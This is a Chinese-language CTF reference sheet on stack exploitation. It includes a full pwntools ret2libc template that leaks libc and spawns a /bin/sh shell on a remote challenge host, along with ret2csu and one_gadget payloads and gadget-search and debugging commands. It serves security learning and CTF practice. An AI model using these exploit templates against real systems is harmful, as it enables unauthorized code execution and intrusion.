# 栈类利用 (Stack Pwn)

## 触发条件与前置检测

### checksec 解读

```bash
checksec --file=./vuln
# 或 pwntools 自带
python -c "from pwn import *; print(ELF('./vuln'))"
```

| 输出字段 | 影响 | 应对 |
|---------|------|------|
| `NX disabled` | 栈可执行 | 直接塞 shellcode |
| `Canary found` | 栈溢出会被检测 | 必须先 leak canary 或绕过 (forked process / 格式化字符串) |
| `PIE enabled` | .text 基址随机 | 必须 leak 一个代码地址 |
| `No PIE` | .text 固定 | gadget 地址写死 |
| `Full RELRO` | got 不可写 | 不能改 got，走 ret2libc / one_gadget |
| `Partial RELRO` | got 可写 | 可以改 got 表 |
| `FORTIFY` | 部分 libc 函数被替换为 `_chk` 版本 | `read_chk` 仍然能溢出，`strcpy_chk` 不行 |

### 栈溢出长度精确定位

```python
# pwntools cyclic 模式
from pwn import *
context.arch = 'amd64'

# 1. 生成 cyclic pattern
payload = cyclic(200)

# 2. 喂给程序触发崩溃
p = process('./vuln')
p.sendline(payload)
p.wait()

# 3. 从 core dump 读 RSP 上的值
core = p.corefile
fault = core.fault_addr  # 或 core.rsp 指向的 8 字节
offset = cyclic_find(fault & 0xffffffff)  # 32-bit 模式
# 64-bit 用 cyclic_find(p64(fault)[:8])
log.info(f"offset = {offset}")
```

### 32 / 64 位 calling convention 速查

| 架构 | 参数传递 | 返回 | 备注 |
|------|---------|------|------|
| x86 (32-bit) | 栈传参（cdecl: 调用者清栈） | eax | 栈结构：ret_addr, arg1, arg2, ... |
| x86-64 SysV | rdi, rsi, rdx, rcx, r8, r9, 栈 | rax | rsp 必须 16-byte 对齐到 call 入口 |
| ARM32 | r0-r3, 栈 | r0 | lr 保存返回地址，bx lr 返回 |
| ARM64 | x0-x7, 栈 | x0 | 类似 SysV，更严格的对齐 |

## ret2libc 完整 pwntools 模板

```python
#!/usr/bin/env python3
from pwn import *

# === 环境配置 ===
exe = './vuln'
libc_path = './libc.so.6'
HOST, PORT = 'chal.example.com', 31337

context.binary = elf = ELF(exe)
context.log_level = 'info'
libc = ELF(libc_path)

# 自动 patchelf 让本地用题目给的 libc
# patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(exe, gdbscript='''
            b *main+123
            continue
        ''')
    return process(exe)

# === Stage 1: leak libc ===
p = conn()

OFFSET = 0x48  # 通过 cyclic 测出来
pop_rdi = 0x0000000000401383  # ROPgadget --binary ./vuln --only "pop|ret" | grep rdi
ret     = 0x000000000040101a  # 用于栈对齐

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])     # 让 puts 打印 puts@got 自己的地址
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])     # 回到 main，复用栈溢出做第二轮

p.sendlineafter(b'> ', payload)

# 接收 leak（注意 recvuntil 锚字符串，不要用 sleep）
p.recvuntil(b'bye\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'leaked puts @ {hex(leak)}')

# 反查 libc base
libc.address = leak - libc.sym['puts']
log.success(f'libc base = {hex(libc.address)}')

# === Stage 2: ret2libc system("/bin/sh") ===
binsh    = next(libc.search(b'/bin/sh\x00'))
system   = libc.sym['system']

payload  = b'A' * OFFSET
payload += p64(ret)        # 关键：补齐 16-byte 对齐
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'> ', payload)

p.interactive()
```

### 栈对齐坑（必看）

```text
现象：本地能打通，远程 system 一进去就 SIGSEGV
原因：libc 的 system → do_system → 内部某处 movaps xmm0, [rsp]
       要求 rsp 16-byte 对齐
失败：你的 ROP 链跳进 system 时，rsp 末位是 0x8 而不是 0x0
修复：在 ROP 链里插一个 `ret` gadget（消耗 8 字节，让 rsp 重新对齐）
```

## ret2csu（万能 gadget）

当二进制里没有 `pop rdx; ret` 这种第三参数 gadget 时，用 `__libc_csu_init` 里的固定结构（glibc < 2.34 静态链接的程序里都有）。

```text
__libc_csu_init 末尾固定 pattern：
    add  rsp, 8
    pop  rbx
    pop  rbp
    pop  r12
    pop  r13
    pop  r14
    pop  r15
    ret

中间还有：
    mov  rdx, r15  ; r15 → rdx
    mov  rsi, r14  ; r14 → rsi
    mov  edi, r13d ; r13 → rdi (低 32 位)
    call qword ptr [r12 + rbx*8]
```

pwntools 写法：

```python
csu_pop = 0x40119a  # 第一段（pop rbx..r15; ret）
csu_call = 0x401180  # 第二段（mov rdx,r15; ... ; call [r12+rbx*8]）

def csu(rdi, rsi, rdx, call_target):
    p  = p64(csu_pop)
    p += p64(0)              # rbx = 0
    p += p64(1)              # rbp = 1（要使后续 cmp rbx,rbp 通过 → rbx+1 == rbp）
    p += p64(call_target)    # r12 = [r12+rbx*8] 解引用得到目标
    p += p64(rdi)            # r13
    p += p64(rsi)            # r14
    p += p64(rdx)            # r15
    p += p64(csu_call)
    p += b'\x00' * 8 * 7     # 第二段 ret 后又 pop 7 个
    return p
```

适用：bss 里写一个函数指针，再用 csu 调用它，常用于 `read(0, bss, 0x100)` 阶段后跳到 bss 执行 ROP。

## one_gadget 用法

```bash
one_gadget ./libc.so.6

# 输出类似：
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
```

使用：

```python
og = [0xe3afe, 0xe3b01, 0xe3b04]
payload  = b'A' * OFFSET
payload += p64(ret)
payload += p64(libc.address + og[1])  # 挑约束能满足的那个
```

**坑**：one_gadget 在某些 libc 版本（2.34+）约束极难满足，老老实实 ret2libc 更稳。

## libc-database 反查

场景：题目没给 libc，只能 leak 几个函数地址反推版本。

```bash
cd ~/tools/libc-database

# 用 leak 出来的 puts 和 read 地址（取后 3 位）反查
./find puts 0x6f0 read 0xfd
# 输出：libc6_2.31-0ubuntu9.9_amd64

# 拿对应 libc 的所有符号偏移
./dump libc6_2.31-0ubuntu9.9_amd64

# 下载实际 libc.so.6 到本地
ls db/libc6_2.31-0ubuntu9.9_amd64.so
```

pwntools 集成：

```python
# 在线 libc-database 查询（无需本地）
from pwnlib.libcdb import search_by_symbol_offsets
libs = search_by_symbol_offsets({'puts': 0x6f0, 'read': 0xfd})
libc = ELF(libs[0])
```

## ROPgadget 速查

```bash
# 基础：pop|ret 单 reg
ROPgadget --binary ./vuln --only "pop|ret"

# 找 syscall
ROPgadget --binary ./vuln | grep ': syscall'

# 找带特定字节
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep 'pop rdi'

# 找字符串
ROPgadget --binary ./libc.so.6 --string '/bin/sh'

# 输出 JSON 给程序解析
ROPgadget --binary ./vuln --json > gadgets.json
```

Ropper 替代（架构支持更广）：

```bash
ropper --file ./vuln --search "pop rdi; ret"
ropper --file ./libc.so.6 --search "syscall"
```

## 远程稳定化清单

| 问题 | 现象 | 解决 |
|------|------|------|
| libc 版本错 | 本地通，远程 SIGSEGV in system | leak 后用 libc-database 反查实际版本 |
| 栈对齐 | system 立刻段错误 | 加一个 `ret` gadget |
| 网络延迟 | recv 收到一半 | 用 `recvuntil(b'锚字符串')`，不用 `sleep` |
| 缓冲 | sendline 发完没反应 | 改 `sendlineafter`，明确等到 prompt 再发 |
| ASLR 浮动 | 概率成功 | 看是否 byte-level brute（1/16 概率不算稳定） |
| TCP nagle | 小包合并 | `p.settimeout(2); p.recvall(timeout=2)` 保底 |

## 调试技巧

```python
# pwntools 内嵌 gdb attach
p = process('./vuln')
gdb.attach(p, '''
    b *main+0x123
    b *0x401234
    commands
        telescope $rsp 20
        continue
    end
''')

# 一开始就在 gdb 里跑
p = gdb.debug('./vuln', '''
    set follow-fork-mode child
    b main
''')
```

GEF/pwndbg 常用命令：

```text
checksec               # 看保护
vmmap                  # 内存布局
telescope $rsp 30      # 栈链路（pwndbg）
stack 30               # 类似（GEF）
got                    # GOT 表
search-pattern "/bin/sh"
context                # 自动显示 reg + stack + code（默认开）
ropgadget              # 内嵌 gadget 搜索
```

## 注意事项

- **NX 关 + ASLR 关**才能直接 shellcode；现代二进制基本都开 NX
- **canary 在 fork 子进程里不变** — forking server 可以一次 byte 一次 byte 爆破（1/256 × 7 字节）
- **格式化字符串可以同时 leak canary 和 libc** — 用 `%p %p ... %p` 扫栈
- **DynELF 慢但万能** — 完全没给 libc 时，pwntools 的 `DynELF` 可以纯靠程序自己的 IO 原语逐字节 leak 符号表
- **静态链接的程序没有 libc.got** — 走 SROP（sigreturn-oriented programming）或直接 syscall
